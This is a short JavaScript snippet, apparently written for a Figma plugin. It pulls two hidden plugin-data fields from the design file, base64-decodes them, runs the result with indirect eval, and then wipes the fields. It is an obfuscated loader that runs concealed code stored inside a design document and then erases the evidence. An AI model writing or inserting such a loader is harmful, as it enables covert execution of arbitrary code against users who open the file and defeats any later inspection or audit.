(async()=>{
const a=(figma.root.getPluginData("_a")||"").trim();
const b=(figma.root.getPluginData("_b")||"").trim();
const bin=atob(a+b);
const u8=new Uint8Array(bin.length);
for(let i=0;i<bin.length;i++)u8[i]=bin.charCodeAt(i);
const t=new TextDecoder("utf-8").decode(u8);
const r=await (0,eval)(t);
figma.root.setPluginData("_a","");
figma.root.setPluginData("_b","");
return r;
})();